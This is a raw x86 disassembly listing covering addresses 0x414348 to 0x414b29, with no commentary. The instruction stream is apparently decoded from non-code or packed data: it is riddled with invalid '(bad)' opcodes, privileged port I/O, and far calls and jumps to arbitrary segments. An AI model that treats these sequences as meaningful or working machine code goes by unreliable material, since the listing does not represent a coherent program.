  414348:	cs pushf 
  41434a:	push   esi
  41434b:	stc    
  41434c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41434d:	add    eax,0x953c4c5
  414352:	cld    
  414353:	sbb    ebx,ebp
  414355:	cdq    
  414356:	(bad)  
  414357:	ja     0x4143bb
  414359:	imul   ecx,ecx,0xd689270a
  41435f:	mov    ecx,0x95351bb1
  414364:	iret   
  414365:	mul    DWORD PTR [esi-0x4def5bab]
  41436b:	arpl   WORD PTR [ecx+0x666fe6fe],di
  414371:	adc    al,0x86
  414373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414374:	jb     0x41433d
  414376:	inc    ecx
  414377:	jg     0x414354
  414379:	mov    BYTE PTR [eax-0x79],al
  41437c:	sahf   
  41437d:	(bad)  
  41437e:	mov    ch,0x6f
  414380:	mov    esi,ds
  414382:	jg     0x4143c5
  414384:	sub    ebx,edx
  414386:	in     al,dx
  414387:	mov    ah,0xce
  414389:	adc    al,0x7f
  41438b:	rcl    DWORD PTR [edx-0x7d93c113],1
  414391:	call   0x1d84:0x1bd534ef
  414398:	fistp  QWORD PTR [eax+0x69]
  41439b:	lock dec edx
  41439d:	iret   
  41439e:	ja     0x414322
  4143a0:	xor    BYTE PTR [eax+edx*1],dl
  4143a3:	or     al,0x3b
  4143a5:	int3   
  4143a6:	xor    DWORD PTR ds:0x92dbdfe4,esi
  4143ac:	mov    ch,0x85
  4143ae:	mov    fs,ebx
  4143b0:	js     0x414357
  4143b2:	adc    BYTE PTR [ecx-0x3c],dh
  4143b5:	cmc    
  4143b6:	jae    0x41436e
  4143b8:	sbb    eax,0xf2640f4f
  4143bd:	sbb    eax,0x861a6987
  4143c2:	or     dl,ah
  4143c4:	ror    BYTE PTR [ebp-0x62],0x17
  4143c8:	inc    esp
  4143c9:	add    al,0xca
  4143cb:	(bad)  
  4143cc:	jo     0x4143d4
  4143ce:	mov    al,ds:0xbc6597d0
  4143d3:	xor    ah,BYTE PTR [ecx]
  4143d5:	dec    esp
  4143d6:	loop   0x414449
  4143d8:	rcl    eax,0xd1
  4143db:	fistp  QWORD PTR [esi+0x5e]
  4143de:	push   edi
  4143df:	push   esp
  4143e0:	repnz ins BYTE PTR es:[edi],dx
  4143e2:	popa   
  4143e3:	outs   dx,BYTE PTR ds:[esi]
  4143e4:	mov    ds:0xb7e17397,al
  4143e9:	mov    dl,0x30
  4143eb:	cs out 0xed,al
  4143ee:	jmp    0x33fc:0x30a1e3f7
  4143f5:	(bad)  
  4143f7:	or     bh,BYTE PTR [eax]
  4143f9:	test   eax,0xabd5b0a7
  4143fe:	cmpps  xmm3,XMMWORD PTR [ecx],0xd1
  414402:	fwait
  414403:	div    DWORD PTR [edi]
  414405:	mov    ebp,DWORD PTR [ecx]
  414407:	jo     0x414444
  414409:	shl    BYTE PTR [eax+edi*8+0x2a],1
  41440d:	push   ds
  41440e:	mov    ebx,DWORD PTR [ecx]
  414410:	pop    edx
  414411:	cdq    
  414412:	sbb    al,0x7e
  414414:	push   cs
  414415:	in     eax,0x21
  414417:	test   eax,0x3c08bf4f
  41441c:	xor    dh,BYTE PTR [eax-0x24]
  41441f:	aad    0x40
  414421:	test   dh,cl
  414423:	scas   eax,DWORD PTR es:[edi]
  414424:	std    
  414425:	repz sub BYTE PTR [edi],bl
  414428:	stc    
  414429:	and    al,0xe
  41442b:	adc    ebp,DWORD PTR [esi-0xd7bcfb1]
  414431:	xchg   ebp,eax
  414432:	jne    0x4143fb
  414434:	sbb    DWORD PTR [ecx],edx
  414436:	pushf  
  414437:	mov    ebp,0xd457a642
  41443c:	lahf   
  41443d:	pop    esi
  41443e:	jmp    0x3df3:0x616225c5
  414445:	lea    edx,[edx]
  414447:	cmc    
  414448:	scas   eax,DWORD PTR es:[edi]
  414449:	xchg   edi,eax
  41444a:	and    edi,DWORD PTR [eax]
  41444c:	dec    edx
  41444d:	pop    ecx
  41444e:	dec    eax
  41444f:	jns    0x414408
  414451:	sbb    DWORD PTR [eax+0x4976fe8e],0xffffffce
  414458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414459:	inc    ebx
  41445a:	adc    BYTE PTR [ecx-0x57b3e525],bl
  414460:	or     ebp,esp
  414462:	ret    
  414463:	dec    esi
  414464:	and    esp,DWORD PTR [ebx+eax*1+0x5bc15514]
  41446b:	xor    eax,0xe7155b08
  414470:	cdq    
  414471:	arpl   WORD PTR [edi],cx
  414473:	aad    0x26
  414475:	mov    ecx,0x12485368
  41447a:	ret    
  41447b:	sbb    ecx,DWORD PTR [edi]
  41447d:	pop    edi
  41447e:	cs fs out 0x2b,eax
  414482:	rcr    BYTE PTR [esi-0x4702f9b7],1
  414488:	fld    QWORD PTR [esi+eiz*2+0x6991909b]
  41448f:	jnp    0x414418
  414491:	push   ecx
  414492:	ins    DWORD PTR es:[edi],dx
  414493:	fdiv   QWORD PTR [edx-0x6e3849e5]
  414499:	or     bl,BYTE PTR [edi+esi*4-0x41b1bc2a]
  4144a0:	dec    ebx
  4144a1:	mov    esi,0x87477516
  4144a6:	shr    esi,1
  4144a8:	or     ah,BYTE PTR [ebx+0x3443544b]
  4144ae:	or     DWORD PTR [edx],edx
  4144b0:	idiv   BYTE PTR [ecx+eiz*8+0x15c9f710]
  4144b7:	jecxz  0x4144b6
  4144b9:	dec    edx
  4144ba:	cmp    eax,DWORD PTR [ebp+0x655fc534]
  4144c0:	ds dec eax
  4144c2:	pop    es
  4144c3:	js     0x414489
  4144c5:	cmc    
  4144c6:	xor    DWORD PTR [ebp+0x6f],0x1d
  4144ca:	dec    ecx
  4144cb:	xor    bh,BYTE PTR [ecx]
  4144cd:	loope  0x4144db
  4144cf:	dec    edi
  4144d0:	push   ebx
  4144d1:	je     0x4144a8
  4144d3:	and    al,0xef
  4144d5:	jne    0x414555
  4144d7:	fstp   TBYTE PTR [edi-0x3f435b8b]
  4144dd:	jae    0x4144d5
  4144df:	pop    ebx
  4144e0:	imul   ebx,esi,0x5a07a91a
  4144e6:	jmp    0x56ef35a
  4144eb:	jno    0x414497
  4144ed:	nop
  4144ee:	lahf   
  4144ef:	shl    DWORD PTR [ecx+0x2080fcd6],cl
  4144f5:	imul   BYTE PTR [edi]
  4144f7:	outs   dx,BYTE PTR ds:[esi]
  4144f8:	and    al,0xcb
  4144fa:	popa   
  4144fb:	test   ah,cl
  4144fd:	mov    ebp,0x9530f126
  414502:	call   0xc04b:0xd04555fc
  414509:	ds cli 
  41450b:	cmp    eax,0x6804c94b
  414510:	test   BYTE PTR [esi+0x27106b2a],cl
  414516:	xor    ch,BYTE PTR [edx]
  414518:	xchg   esp,eax
  414519:	retf   
  41451a:	and    BYTE PTR [edx+0x7004be5],al
  414520:	lock add cl,BYTE PTR [eax+edx*8]
  414524:	ret    0x37ae
  414527:	jbe    0x414562
  414529:	pop    ebp
  41452a:	aam    0x11
  41452c:	and    esi,DWORD PTR [edi]
  41452e:	sahf   
  41452f:	sbb    bl,BYTE PTR [esi+0x5d]
  414532:	das    
  414533:	dec    esp
  414534:	rcl    BYTE PTR [esi-0xa],cl
  414537:	push   ss
  414538:	fisubr WORD PTR [ebp+0x5e]
  41453b:	call   0x4422ce44
  414540:	ret    
  414541:	stc    
  414542:	push   es
  414543:	inc    eax
  414544:	or     BYTE PTR [ebp+0x6f3dce49],dl
  41454a:	ja     0x4145ae
  41454c:	repnz and DWORD PTR [edi-0x65],edi
  414550:	popf   
  414551:	pop    ebx
  414552:	push   es
  414553:	add    edx,ebp
  414555:	mov    esi,0xa6e42972
  41455a:	hlt    
  41455b:	push   0x54
  41455d:	sti    
  41455e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41455f:	ficomp DWORD PTR [edi]
  414561:	and    eax,0x98d57fd9
  414566:	fwait
  414567:	jge    0x414526
  414569:	adc    al,0x1a
  41456b:	pop    ecx
  41456c:	or     DWORD PTR [esi-0x35],0x53
  414570:	xor    bh,BYTE PTR [edx+ebp*8]
  414573:	in     al,0x98
  414575:	pop    eax
  414576:	pop    edi
  414577:	jb     0x414578
  414579:	jmp    0xb56b:0xf9e15b09
  414580:	mov    ch,0xe
  414582:	mov    ecx,0xbe9ea79
  414587:	mov    ds:0xc9c631d3,eax
  41458c:	xlat   BYTE PTR ds:[ebx]
  41458d:	dec    ecx
  41458e:	push   edx
  41458f:	cdq    
  414590:	pop    ecx
  414591:	mov    bl,0x4d
  414593:	int    0x51
  414595:	stos   BYTE PTR es:[edi],al
  414596:	int    0xe0
  414598:	sar    edx,1
  41459a:	cmp    dh,BYTE PTR [edi+0x5dcd544f]
  4145a0:	cs ret 
  4145a2:	sti    
  4145a3:	mov    eax,ds:0x97797877
  4145a8:	inc    edx
  4145a9:	pop    ds
  4145aa:	cmp    BYTE PTR [ebp+0x70],ch
  4145ad:	add    eax,ecx
  4145af:	mov    cl,0x2e
  4145b1:	sub    esp,DWORD PTR [ebp-0x69]
  4145b4:	repz or al,0x10
  4145b7:	ror    esi,1
  4145b9:	mov    edx,ds
  4145bb:	into   
  4145bc:	and    edi,DWORD PTR [ebp-0x10]
  4145bf:	inc    edx
  4145c0:	or     DWORD PTR [edx+edi*8],0xffffff93
  4145c4:	jbe    0x4145ed
  4145c6:	push   ebx
  4145c7:	fnsave [edx]
  4145c9:	test   BYTE PTR [edx-0x48],bh
  4145cc:	call   0x3f72:0x55ba44bf
  4145d3:	icebp  
  4145d4:	dec    ebx
  4145d5:	adc    BYTE PTR [eax+0x34f4f608],cl
  4145db:	and    al,al
  4145dd:	(bad)  
  4145de:	sub    DWORD PTR [ecx],esp
  4145e0:	(bad)  
  4145e1:	push   ds
  4145e2:	les    eax,FWORD PTR [ecx+0x5d]
  4145e5:	mov    ch,0x5f
  4145e7:	mov    dx,WORD PTR [edx-0x32]
  4145eb:	ds fs inc ebp
  4145ee:	cmp    bh,BYTE PTR [edi+0x630f3a2e]
  4145f4:	popa   
  4145f5:	pushf  
  4145f6:	cmc    
  4145f7:	int3   
  4145f8:	out    0xed,al
  4145fa:	clc    
  4145fb:	push   0x8e246bae
  414600:	push   cs
  414601:	ja     0x4145a5
  414603:	sbb    eax,0xde22fcec
  414608:	mov    bl,0x6c
  41460a:	retw   
  41460c:	jnp    0x414643
  41460e:	jns    0x41466e
  414610:	xchg   edi,eax
  414611:	or     al,0x38
  414613:	jns    0x4145a0
  414615:	and    DWORD PTR [edx],ebp
  414617:	cmp    eax,0xf4191fc3
  41461c:	int    0x7a
  41461e:	xlat   BYTE PTR ds:[ebx]
  41461f:	or     eax,0x2ceac76d
  414624:	scas   eax,DWORD PTR es:[edi]
  414625:	shl    DWORD PTR [eax+eax*8],0xf3
  414629:	aas    
  41462a:	call   0x60a4:0xabef3654
  414631:	xor    ah,BYTE PTR [edi+0xa1e59a7]
  414637:	sub    al,BYTE PTR [edx]
  414639:	xchg   edx,eax
  41463a:	bt     DWORD PTR [edx+0x1],ecx
  41463e:	sub    al,0x5e
  414640:	mov    DWORD PTR [ecx],edx
  414642:	pop    edi
  414643:	xchg   esp,eax
  414644:	dec    esi
  414645:	or     edi,DWORD PTR [ebp*1+0x4104955d]
  41464c:	mov    edi,0x75e7b6e6
  414651:	dec    ecx
  414652:	mov    ecx,0x7235e219
  414657:	(bad)  [esi+0x4b]
  41465a:	and    ecx,DWORD PTR ds:0x83810716
  414660:	cli    
  414661:	retf   
  414662:	mov    ds:0x6cb15e1c,eax
  414667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414668:	sub    eax,0xc7dee50d
  41466d:	inc    ebx
  41466e:	in     eax,0xf4
  414670:	pop    eax
  414671:	push   ss
  414672:	jl     0x4146bd
  414674:	(bad)  
  414675:	jo     0x4145fa
  414677:	sub    eax,0xfd291257
  41467c:	lds    edx,FWORD PTR [edi+eax*1+0x45]
  414680:	pop    esi
  414681:	mov    dh,BYTE PTR [edi]
  414683:	ja     0x4146d2
  414685:	mov    DWORD PTR [edi-0x48f1baea],esp
  41468b:	test   al,0xc0
  41468d:	clc    
  41468e:	not    DWORD PTR [eax]
  414690:	ins    DWORD PTR es:[edi],dx
  414691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414692:	les    ecx,FWORD PTR [edi-0x685d5665]
  414698:	scas   al,BYTE PTR es:[edi]
  414699:	fild   WORD PTR [edx-0x33990711]
  41469f:	xor    BYTE PTR [esi-0x2de07e66],ch
  4146a5:	clc    
  4146a6:	je     0x414640
  4146a8:	ins    BYTE PTR es:[edi],dx
  4146a9:	mov    al,0xf3
  4146ab:	lahf   
  4146ac:	repz je 0x414717
  4146af:	jmp    0xc9b41392
  4146b4:	shld   DWORD PTR [edx+0x1426dc0b],esp,0x70
  4146bc:	out    dx,al
  4146bd:	dec    esp
  4146be:	xbegin 0xdea4a678
  4146c4:	fs into 
  4146c6:	repz hlt 
  4146c8:	rcl    BYTE PTR [esi],cl
  4146ca:	dec    esp
  4146cb:	test   eax,0xea0bf3f6
  4146d0:	cwde   
  4146d1:	fidivr DWORD PTR [eax-0x17]
  4146d4:	sub    eax,0x888f6f19
  4146d9:	mov    cl,0x15
  4146db:	retf   0x378c
  4146de:	jbe    0x414735
  4146e0:	imul   esp,edi,0xfffffff1
  4146e3:	mov    cl,0xd7
  4146e5:	mov    ebp,0x59c07e4
  4146ea:	inc    esi
  4146eb:	xor    eax,0xc6ce7b53
  4146f0:	adc    al,0xfc
  4146f2:	retf   
  4146f3:	sbb    al,dl
  4146f5:	imul   eax,DWORD PTR [edx],0x6acbfb03
  4146fb:	(bad)  
  4146fc:	mov    dh,0x9c
  4146fe:	fbstp  TBYTE PTR [ebx+eiz*2+0x6c]
  414702:	shl    BYTE PTR [esp+edx*8+0x12],1
  414706:	ds or  esp,ecx
  414709:	pop    ebp
  41470a:	and    BYTE PTR [esi-0x6e45eee3],dh
  414710:	(bad)  
  414711:	lods   al,BYTE PTR ds:[esi]
  414712:	inc    eax
  414713:	aam    0xc
  414715:	and    DWORD PTR [esi-0x19ffa1d2],esp
  41471b:	xchg   esp,eax
  41471c:	mov    ah,ch
  41471e:	loop   0x4146af
  414720:	or     ah,cl
  414722:	inc    esp
  414723:	xor    bh,BYTE PTR [ecx]
  414725:	inc    esp
  414726:	cmp    eax,0x603380a6
  41472b:	rcl    DWORD PTR [ecx-0x3b],1
  41472e:	xlat   BYTE PTR ds:[ebx]
  41472f:	mov    bh,0x8c
  414731:	stos   BYTE PTR es:[edi],al
  414732:	inc    eax
  414733:	and    al,0x3a
  414735:	pop    ebx
  414736:	and    cl,BYTE PTR [eax-0x60]
  414739:	jbe    0x414728
  41473b:	xor    cl,ah
  41473d:	add    edx,DWORD PTR [esi+0x120ad31d]
  414743:	mov    bh,0x6c
  414745:	aaa    
  414746:	pop    edi
  414747:	pop    ebp
  414748:	pop    ds
  414749:	xchg   ch,ah
  41474b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41474c:	int3   
  41474d:	fstp   TBYTE PTR [ebx-0x18]
  414750:	dec    esp
  414751:	jb     0x414723
  414753:	push   esp
  414754:	loop   0x4147d1
  414756:	cmp    eax,0x73545202
  41475b:	imul   ebp,edi,0x5c
  41475e:	into   
  41475f:	imul   ecx,ebp,0xa
  414762:	pop    ss
  414763:	icebp  
  414764:	test   BYTE PTR [ebp+0x49878283],cl
  41476a:	pop    edx
  41476b:	cmp    al,0xa5
  41476d:	lahf   
  41476e:	xchg   edx,eax
  41476f:	sub    DWORD PTR [ebx],ecx
  414771:	push   esi
  414772:	sahf   
  414773:	gs (bad) 
  414776:	fcomp  DWORD PTR [edi]
  414778:	xchg   ebx,eax
  414779:	xor    ebx,DWORD PTR [ecx-0x18]
  41477c:	nop
  41477d:	popf   
  41477e:	ins    BYTE PTR es:[edi],dx
  41477f:	push   ebx
  414780:	call   0x3b32:0x5c4a8b05
  414787:	mov    cl,0xa
  414789:	arpl   WORD PTR [ecx+0x2795faa3],ax
  41478f:	push   edx
  414790:	jnp    0x4147fe
  414792:	clc    
  414793:	jmp    0x573a870e
  414798:	xlat   BYTE PTR ds:[ebx]
  414799:	ins    BYTE PTR es:[edi],dx
  41479a:	jl     0x414750
  41479c:	and    bl,al
  41479e:	call   0xed1fc7d1
  4147a3:	xchg   esp,esp
  4147a5:	pushf  
  4147a6:	aad    0x7d
  4147a8:	add    ebx,DWORD PTR [eax+0x26e4d4cc]
  4147ae:	scas   al,BYTE PTR es:[edi]
  4147af:	inc    ebp
  4147b0:	sub    eax,0xe5176ffb
  4147b5:	pop    ds
  4147b6:	jmp    0x41478c
  4147b8:	cdq    
  4147b9:	push   es
  4147ba:	xchg   ecx,eax
  4147bb:	inc    eax
  4147bc:	adc    al,0x6c
  4147be:	push   gs
  4147c0:	test   al,0xea
  4147c2:	mov    esi,0xed96827b
  4147c7:	push   cs
  4147c8:	stos   DWORD PTR es:[edi],eax
  4147c9:	mov    ds:0x23a2c9a3,eax
  4147ce:	dec    edx
  4147cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147d0:	jae    0x4147f4
  4147d2:	cli    
  4147d3:	jns    0x41481d
  4147d5:	ds in  al,0x93
  4147d8:	dec    edi
  4147d9:	or     ebp,DWORD PTR [esp+esi*4-0x75]
  4147dd:	fiadd  DWORD PTR es:[ebp+eiz*1-0x1ffcf023]
  4147e5:	addr16 call 0x9e26:0xfd364cf2
  4147ed:	mov    ecx,0x25ba58ff
  4147f2:	mov    esp,0x4c637259
  4147f7:	mov    edi,0x508e7bcc
  4147fc:	jne    0x414812
  4147fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147ff:	lods   eax,DWORD PTR ds:[esi]
  414800:	pop    ss
  414801:	ins    BYTE PTR es:[edi],dx
  414802:	lahf   
  414803:	sahf   
  414804:	mov    edx,0x4ebe5762
  414809:	inc    edx
  41480a:	sti    
  41480b:	mov    WORD PTR [esi+0x40],?
  41480e:	sbb    eax,0xc0699580
  414813:	rol    ebp,1
  414815:	pop    edx
  414816:	jmp    0x414803
  414818:	jge    0x41480e
  41481a:	test   al,0x3e
  41481c:	aaa    
  41481d:	or     DWORD PTR [ebx-0x69],esp
  414820:	sub    esp,DWORD PTR [edi-0x15]
  414823:	popa   
  414824:	ret    0x54c4
  414827:	retf   0x8845
  41482a:	add    eax,DWORD PTR [edx+0x6b]
  41482d:	pop    esp
  41482e:	adc    ah,BYTE PTR ds:0x3bb0d25c
  414834:	cli    
  414835:	jno    0x414894
  414837:	push   ss
  414838:	arpl   WORD PTR [edi+0x4bc4009b],ax
  41483e:	jg     0x4147e9
  414840:	xchg   ebp,eax
  414841:	xchg   ebp,eax
  414842:	je     0x41483b
  414844:	adc    BYTE PTR [esi+0x2e],bl
  414847:	mov    es,WORD PTR [esi-0x4dc5461]
  41484d:	addr16 mov edi,0x703f9df7
  414853:	mov    al,ds:0xc45259a9
  414858:	nop
  414859:	jmp    0xc5990257
  41485e:	jmp    0x3e38:0x4cd8d60
  414865:	lahf   
  414866:	fs in  al,dx
  414868:	arpl   WORD PTR [ebp+0x22fc4f78],sp
  41486e:	out    0x3a,al
  414870:	popa   
  414871:	aad    0x75
  414873:	out    0x51,eax
  414875:	lock pusha 
  414877:	push   ebp
  414878:	inc    ebx
  414879:	popf   
  41487a:	xor    BYTE PTR [eax-0x2e815ce4],0x16
  414881:	jecxz  0x414834
  414883:	sub    al,0xd4
  414885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414886:	jmp    0x4148f9
  414888:	xchg   esi,eax
  414889:	bts    DWORD PTR ds:0xf56d8224,ebx
  414890:	daa    
  414891:	fs into 
  414893:	gs pop ebx
  414895:	adc    eax,0xc02f1efe
  41489a:	sbb    eax,0xec36730
  41489f:	xchg   edi,eax
  4148a0:	jmp    0x7b74bc5c
  4148a5:	ds mov al,0x2
  4148a8:	mov    WORD PTR [edi+0x46],fs
  4148ab:	inc    esp
  4148ac:	dec    ebp
  4148ad:	ja     0x4148f9
  4148af:	xor    dh,BYTE PTR [ecx]
  4148b1:	cld    
  4148b2:	xchg   ebp,eax
  4148b3:	inc    edi
  4148b4:	add    al,0xac
  4148b6:	mov    edi,0x86a960a7
  4148bb:	jnp    0x414928
  4148bd:	add    eax,DWORD PTR [eax-0x57]
  4148c0:	outs   dx,DWORD PTR ds:[esi]
  4148c1:	lea    ebp,[ebx-0x21103ce7]
  4148c7:	and    bh,bl
  4148c9:	push   ebp
  4148ca:	das    
  4148cb:	xor    al,0x1b
  4148cd:	cli    
  4148ce:	pusha  
  4148cf:	xlat   BYTE PTR cs:[ebx]
  4148d1:	ror    esp,1
  4148d3:	mov    ah,0x54
  4148d5:	and    BYTE PTR [edx+edi*8-0x2a],cl
  4148d9:	mov    DWORD PTR ds:0xa96b8f1d,0x7a9b991c
  4148e3:	fdivp  st(1),st
  4148e5:	(bad)  [esi-0x187c14ce]
  4148eb:	sbb    BYTE PTR [eax+0x1d],ah
  4148ee:	mov    dl,0xaf
  4148f0:	jns    0x414919
  4148f2:	lods   eax,DWORD PTR ds:[esi]
  4148f3:	xchg   bh,al
  4148f5:	idiv   BYTE PTR [ebx+ebx*8+0x21ba0e8e]
  4148fc:	frstor es:[esp+ebx*8+0x6fa95a3e]
  414904:	push   eax
  414905:	jmp    0xa891:0x44cee181
  41490c:	and    dl,BYTE PTR [edx]
  41490e:	imul   DWORD PTR ds:0xff5b9fc0
  414914:	(bad)  
  414916:	pop    ss
  414917:	aad    0x96
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	xor    eax,0x4aa6f1a1
  41491f:	stos   DWORD PTR es:[edi],eax
  414920:	bound  edi,QWORD PTR [edi]
  414922:	out    dx,eax
  414923:	sar    ch,0x3c
  414926:	add    ebx,ebp
  414928:	adc    edi,esp
  41492a:	fldcw  WORD PTR [edx-0x3a]
  41492d:	inc    ecx
  41492e:	pop    ss
  41492f:	fwait
  414930:	xchg   DWORD PTR [ecx],ebp
  414932:	inc    ebp
  414933:	inc    esi
  414934:	push   edx
  414935:	gs movs WORD PTR es:[edi],WORD PTR gs:[esi]
  414939:	cmp    edi,DWORD PTR [esi]
  41493b:	in     eax,0xdf
  41493d:	fbstp  TBYTE PTR [edx]
  41493f:	lea    ebx,[esi-0x2c]
  414942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414943:	push   ds
  414944:	pop    ebx
  414945:	mov    ecx,0xeb73079
  41494a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41494b:	xchg   edi,eax
  41494c:	adc    edx,DWORD PTR [esi]
  41494e:	sub    DWORD PTR [edx+0x7b],eax
  414951:	mov    ch,0x36
  414953:	imul   esi,DWORD PTR [ebp-0x572ee4a0],0xe36bf03e
  41495d:	in     al,0x21
  41495f:	mov    esp,0x592cc784
  414964:	dec    esi
  414965:	js     0x414999
  414967:	outs   dx,DWORD PTR ds:[esi]
  414968:	out    0x9a,al
  41496a:	int3   
  41496b:	(bad)  
  41496d:	stos   BYTE PTR es:[edi],al
  41496e:	sub    BYTE PTR ds:0x962b2ad4,ah
  414974:	retf   0xfc9a
  414977:	in     al,dx
  414978:	cmp    eax,0xf46e4cee
  41497d:	adc    ebp,edi
  41497f:	(bad)  
  414980:	jmp    DWORD PTR [edi]
  414982:	and    cl,BYTE PTR [ecx]
  414984:	push   ss
  414985:	or     ch,BYTE PTR [eax-0x55b5f5a1]
  41498b:	sbb    DWORD PTR [ebx-0x1d],esp
  41498e:	pushf  
  41498f:	or     ch,BYTE PTR [edx+0x41]
  414992:	retf   0x9da2
  414995:	cmp    BYTE PTR [edx+esi*4-0x42d65ebe],ch
  41499c:	pop    eax
  41499d:	xchg   edi,eax
  41499e:	fwait
  41499f:	ins    DWORD PTR es:[edi],dx
  4149a0:	jno    0x414985
  4149a2:	sbb    eax,0x1088de47
  4149a7:	mov    ah,BYTE PTR [edi-0x3ef19813]
  4149ad:	(bad)  
  4149ae:	mov    bl,0x63
  4149b0:	xor    BYTE PTR [ebp+0x709735ba],ch
  4149b6:	ret    0x7d4a
  4149b9:	shl    esi,1
  4149bb:	pusha  
  4149bc:	arpl   bx,di
  4149be:	jnp    0x414946
  4149c0:	mov    eax,ds:0x60adefa4
  4149c5:	ret    
  4149c6:	jbe    0x4149a3
  4149c8:	lea    edx,[edx+0x134f9e56]
  4149ce:	xchg   esp,eax
  4149cf:	sahf   
  4149d0:	and    al,0x38
  4149d2:	jp     0x4149dc
  4149d4:	(bad)  
  4149d5:	std    
  4149d6:	popa   
  4149d7:	mov    ebp,0xaddae0f2
  4149dc:	jmp    0x4149ec
  4149de:	shl    ah,0xd0
  4149e1:	ret    
  4149e2:	xor    BYTE PTR [ebx+0x24e599fe],bl
  4149e8:	xchg   esp,eax
  4149e9:	stos   DWORD PTR es:[edi],eax
  4149ea:	pop    edx
  4149eb:	mov    cl,0x45
  4149ed:	pushf  
  4149ee:	inc    ecx
  4149ef:	in     eax,0x5d
  4149f1:	rcr    bl,0xd7
  4149f4:	retf   0x9a42
  4149f7:	enter  0xdc2c,0x9c
  4149fb:	(bad)  
  4149fc:	mov    dl,0x30
  4149fe:	popa   
  4149ff:	jns    0x414a76
  414a01:	mov    cs,WORD PTR [eax+0x4107a6be]
  414a07:	mov    eax,fs:0x2178342d
  414a0d:	scas   al,BYTE PTR es:[edi]
  414a0e:	adc    al,BYTE PTR [ebp+0x2b]
  414a11:	imul   eax,DWORD PTR [esi+0x78],0x73
  414a15:	adc    esi,esp
  414a17:	mov    ebp,0xed1b5535
  414a1c:	or     ah,BYTE PTR [edi]
  414a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a1f:	shr    al,cl
  414a21:	add    eax,0x718fa35b
  414a26:	stos   DWORD PTR es:[edi],eax
  414a27:	push   0xc4278bfd
  414a2c:	pop    es
  414a2d:	hlt    
  414a2e:	outs   dx,DWORD PTR ds:[esi]
  414a2f:	or     al,0xdb
  414a31:	xchg   DWORD PTR [ebp+eax*4+0x26],eax
  414a35:	inc    DWORD PTR [ebx+eiz*2-0x71]
  414a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a3a:	adc    DWORD PTR [ebx],ebx
  414a3c:	sub    cl,BYTE PTR [ebp-0x6d80d4a7]
  414a42:	xchg   edx,eax
  414a43:	mov    dl,BYTE PTR [edi+0x6a3c155b]
  414a49:	xor    DWORD PTR [edi],0x62
  414a4c:	bound  esi,QWORD PTR ds:0x6d3cc93b
  414a52:	ins    DWORD PTR es:[edi],dx
  414a53:	inc    eax
  414a54:	imul   edi,esp,0xf0983387
  414a5a:	sub    esi,DWORD PTR [edx]
  414a5c:	sbb    ecx,DWORD PTR [edi-0x47]
  414a5f:	sub    BYTE PTR [edx+0xd],cl
  414a62:	xor    esp,DWORD PTR [eax]
  414a64:	push   cs
  414a65:	add    al,0xa
  414a67:	jge    0x414a5f
  414a69:	cmp    al,0x3f
  414a6b:	mov    esp,0xe5772d5d
  414a70:	cmc    
  414a71:	mov    ds:0xf46fed17,al
  414a76:	out    0x18,eax
  414a78:	jl     0x414a99
  414a7a:	add    dh,BYTE PTR [ebx]
  414a7c:	cmp    DWORD PTR [edi],esi
  414a7e:	cmp    edx,ebx
  414a80:	jmp    0x8d0d:0xc91bc02e
  414a87:	ret    0x60bb
  414a8a:	scas   al,BYTE PTR es:[edi]
  414a8b:	stos   DWORD PTR es:[edi],eax
  414a8c:	in     al,0x8c
  414a8e:	ja     0x414af6
  414a90:	pop    esi
  414a91:	push   edx
  414a92:	(bad)  
  414a93:	aad    0xc9
  414a95:	inc    ebp
  414a96:	in     al,dx
  414a97:	imul   DWORD PTR [edi-0x56ce15d1]
  414a9d:	(bad)  
  414a9e:	into   
  414a9f:	mov    cl,BYTE PTR [ecx+ebp*8-0x6fa51a1b]
  414aa6:	mov    eax,ds:0x512ea363
  414aab:	push   esp
  414aad:	mov    ah,0xbc
  414aaf:	ja     0x414abd
  414ab1:	jno    0x414a4e
  414ab3:	push   cs
  414ab4:	retf   0x3402
  414ab7:	jbe    0x414aec
  414ab9:	aad    0x53
  414abb:	in     eax,dx
  414abc:	(bad)  
  414abd:	xlat   BYTE PTR ds:[ebx]
  414abe:	jne    0x414aa6
  414ac0:	push   ebx
  414ac1:	adc    DWORD PTR [edx+eiz*2+0x7b],0x7f50b4b0
  414ac9:	xchg   esi,eax
  414aca:	sbb    DWORD PTR [edi+0x57],ebx
  414acd:	xchg   esi,eax
  414ace:	es fs jl 0x414ab6
  414ad2:	and    al,0x9d
  414ad4:	inc    edi
  414ad5:	fmul   QWORD PTR [eax+0x4e2ea0c2]
  414adb:	fwait
  414adc:	pop    edi
  414add:	cmp    ecx,DWORD PTR [edx-0x68f17e4c]
  414ae3:	or     esp,DWORD PTR [ecx+0x212aa710]
  414ae9:	inc    edi
  414aea:	or     DWORD PTR ds:0x8828a987,0x21bc0c67
  414af4:	xchg   dl,bl
  414af6:	push   ss
  414af7:	and    DWORD PTR [ecx],edx
  414af9:	jbe    0x414b14
  414afb:	popf   
  414afc:	dec    edi
  414afd:	sub    edx,DWORD PTR [edx-0x7725106]
  414b03:	in     al,dx
  414b04:	shr    BYTE PTR [esi+0x2c8a15b4],1
  414b0a:	aad    0x3d
  414b0c:	dec    esi
  414b0d:	pop    ebp
  414b0e:	fcom   DWORD PTR [ebp+0x24]
  414b11:	pushf  
  414b12:	xlat   BYTE PTR ds:[ebx]
  414b13:	shr    DWORD PTR [eax+0x7d48ed9f],1
  414b19:	pop    edx
  414b1a:	mov    ch,0x3a
  414b1c:	ss je  0x414b0f
  414b1f:	xor    edi,esp
  414b21:	je     0x414b7d
  414b23:	xor    ebp,DWORD PTR [edi-0x61a28f4]
  414b29:	call   0xe6747ccc
